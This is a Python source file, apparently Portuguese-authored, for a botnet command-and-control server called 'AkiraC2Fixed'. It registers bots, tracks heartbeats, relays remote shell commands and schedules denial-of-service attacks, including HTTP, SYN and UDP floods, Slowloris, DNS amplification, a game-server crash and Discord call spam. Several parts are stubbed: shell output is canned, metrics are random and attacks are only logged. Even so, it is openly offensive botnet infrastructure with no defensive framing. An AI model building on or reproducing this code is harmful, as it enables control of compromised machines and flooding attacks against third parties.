#!/usr/bin/env python3
import socket
import json
import threading
import time
import sqlite3
from datetime import datetime
import logging
import random

class AkiraC2Fixed:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.bots = {}
        self.setup_logging()
        print(f"[C2] Server initialized on {host}:{port}")
        
    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(message)s',
            handlers=[logging.StreamHandler()]
        )
        self.logger = logging.getLogger()
    
    def handle_connection(self, conn, addr):
        """Handle all connections"""
        try:
            # Receber dados
            data = b""
            while True:
                chunk = conn.recv(4096)
                if not chunk:
                    break
                data += chunk
                if b"\n" in chunk or len(chunk) < 4096:
                    break
            
            if data:
                message_str = data.decode().strip()
                self.logger.info(f"Received: {message_str[:100]}... from {addr[0]}")
                
                try:
                    message = json.loads(message_str)
                    response = self.process_message(message, addr[0])
                    
                    # Enviar resposta
                    response_json = json.dumps(response) + "\n"
                    conn.send(response_json.encode())
                    
                except json.JSONDecodeError as e:
                    self.logger.error(f"JSON decode error: {e}")
                    error_response = {"status": "error", "message": "Invalid JSON"}
                    conn.send(json.dumps(error_response).encode() + b"\n")
                    
        except Exception as e:
            self.logger.error(f"Connection error: {e}")
        finally:
            conn.close()
    
    def process_message(self, message, client_ip):
        """Process all types of messages"""
        msg_type = message.get("type")
        
        # PAINEL COMMANDS
        if msg_type == "panel_auth":
            return {"status": "authenticated", "session_id": message.get("session_id")}
            
        elif msg_type == "get_bots":
            return {"status": "success", "bots": self.bots}
            
        elif msg_type == "ping":
            target = message.get("target")
            return self.handle_ping(target)
            
        elif msg_type == "shell":
            return self.handle_shell(message)
            
        elif msg_type == "attack":
            return self.handle_attack(message)
            
        elif msg_type == "delete_bot":
            return self.handle_delete_bot(message.get("target"))
        
        # BOT COMMANDS  
        elif msg_type == "register":
            return self.handle_bot_register(message, client_ip)
            
        elif msg_type == "heartbeat":
            return self.handle_heartbeat(message)
            
        elif msg_type == "task_result":
            return {"status": "result_received"}
        
        else:
            return {"status": "error", "message": "Unknown command type"}
    
    def handle_bot_register(self, message, client_ip):
        """Handle bot registration"""
        bot_id = message.get("bot_id", f"BOT_{int(time.time())}")
        os_info = message.get("os", "Unknown")
        
        self.bots[bot_id] = {
            "ip": client_ip,
            "os": os_info,
            "online": True,
            "last_seen": datetime.now().isoformat(),
            "cpu_usage": f"{random.randint(5, 80)}%",
            "ram_usage": f"{random.randint(20, 90)}%",
            "architecture": message.get("architecture", "Unknown"),
            "country": "Unknown"
        }
        
        self.logger.info(f"Bot registered: {bot_id} from {client_ip}")
        return {"status": "registered", "bot_id": bot_id}
    
    def handle_heartbeat(self, message):
        """Handle bot heartbeat"""
        bot_id = message.get("bot_id")
        if bot_id in self.bots:
            self.bots[bot_id]["last_seen"] = datetime.now().isoformat()
            self.bots[bot_id]["online"] = True
            self.bots[bot_id]["cpu_usage"] = message.get("cpu_usage", f"{random.randint(5, 80)}%")
            self.bots[bot_id]["ram_usage"] = message.get("ram_usage", f"{random.randint(20, 90)}%")
            
        return {"status": "heartbeat_received"}
    
    def handle_ping(self, target_bot=None):
        """Handle ping command"""
        if target_bot:
            # Ping específico
            if target_bot in self.bots:
                bot_info = self.bots[target_bot]
                ping_data = {
                    target_bot: {
                        "ping": f"{random.randint(5, 50)}ms",
                        "os": bot_info["os"],
                        "cpu_usage": bot_info["cpu_usage"],
                        "ram_usage": bot_info["ram_usage"],
                        "uptime": f"{random.randint(1, 24)}h {random.randint(0, 59)}m",
                        "architecture": bot_info["architecture"],
                        "country": bot_info["country"]
                    }
                }
                return {"status": "success", "pings": ping_data}
            else:
                return {"status": "error", "message": "Bot not found"}
        else:
            # Ping todos os bots
            pings = {}
            for bot_id, bot_info in self.bots.items():
                if bot_info["online"]:
                    pings[bot_id] = {
                        "ping": f"{random.randint(5, 100)}ms",
                        "os": bot_info["os"],
                        "cpu_usage": bot_info["cpu_usage"],
                        "ram_usage": bot_info["ram_usage"],
                        "uptime": f"{random.randint(1, 72)}h {random.randint(0, 59)}m",
                        "architecture": bot_info["architecture"],
                        "country": bot_info["country"]
                    }
            return {"status": "success", "pings": pings}
    
    def handle_shell(self, message):
        """Handle shell command"""
        command = message.get("command", "")
        target_bot = message.get("target")
        
        # Simular execução de comando
        if command == "ls" or command == "dir":
            output = "bot.exe\nsystem32\nusers\ndocuments\nconfig.txt\n"
        elif command == "whoami":
            output = f"root\\bot_{target_bot}\n"
        elif command.startswith("cd "):
            output = f"Changed directory to {command[3:]}\n"
        elif command == "pwd":
            output = "/home/bot\n"
        elif command == "uname -a":
            output = "Linux bot-machine 5.4.0 x86_64\n"
        elif command == "ipconfig" or command == "ifconfig":
            output = "eth0: 192.168.1.100\nlo: 127.0.0.1\n"
        else:
            output = f"Command '{command}' executed successfully\n"
        
        return {
            "status": "success", 
            "output": f"root@bot{target_bot}:~# {command}\n{output}"
        }
    
    def handle_attack(self, message):
        """Handle attack commands"""
        attack_type = message.get("attack_type")
        params = message.get("params", {})
        target_bot = message.get("target_bot")
        
        target = params.get("target", "unknown")
        port = params.get("port", 80)
        duration = params.get("duration", 60)
        
        attack_messages = {
            "http_flood": f"HTTP Flood scheduled for {target}:{port} for {duration}s",
            "syn_flood": f"SYN Flood scheduled for {target}:{port} for {duration}s",
            "udp_flood": f"UDP Flood scheduled for {target}:{port} for {duration}s",
            "slowloris": f"Slowloris attack scheduled for {target}:{port} for {duration}s",
            "gta_samp": f"GTA SA-MP crash scheduled for {target}:{port}",
            "discord_spam": f"Discord call spam scheduled for channel {target} for {duration}s",
            "dns_amp": f"DNS Amplification scheduled for {target} for {duration}s"
        }
        
        if attack_type in attack_messages:
            message = attack_messages[attack_type]
            if target_bot:
                message += f" on bot {target_bot}"
            
            self.logger.info(f"Attack scheduled: {attack_type} -> {target}")
            return {"status": "success", "message": message}
        else:
            return {"status": "error", "message": f"Unknown attack type: {attack_type}"}
    
    def handle_delete_bot(self, bot_id):
        """Handle bot deletion"""
        if bot_id in self.bots:
            del self.bots[bot_id]
            self.logger.info(f"Bot deleted: {bot_id}")
            return {"status": "success", "message": f"Bot {bot_id} deleted"}
        else:
            return {"status": "error", "message": "Bot not found"}
    
    def start_server(self):
        """Start the C2 server"""
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((self.host, self.port))
        server_socket.listen(10)
        
        self.logger.info(f"C2 Server started on {self.host}:{self.port}")
        self.logger.info("Waiting for connections...")
        
        try:
            while True:
                conn, addr = server_socket.accept()
                self.logger.info(f"New connection from {addr[0]}:{addr[1]}")
                
                # Criar thread para cada conexão
                client_thread = threading.Thread(
                    target=self.handle_connection, 
                    args=(conn, addr)
                )
                client_thread.daemon = True
                client_thread.start()
                
        except KeyboardInterrupt:
            self.logger.info("Shutting down C2 server...")
        except Exception as e:
            self.logger.error(f"Server error: {e}")
        finally:
            server_socket.close()

if __name__ == "__main__":
    c2_server = AkiraC2Fixed()
    c2_server.start_server()
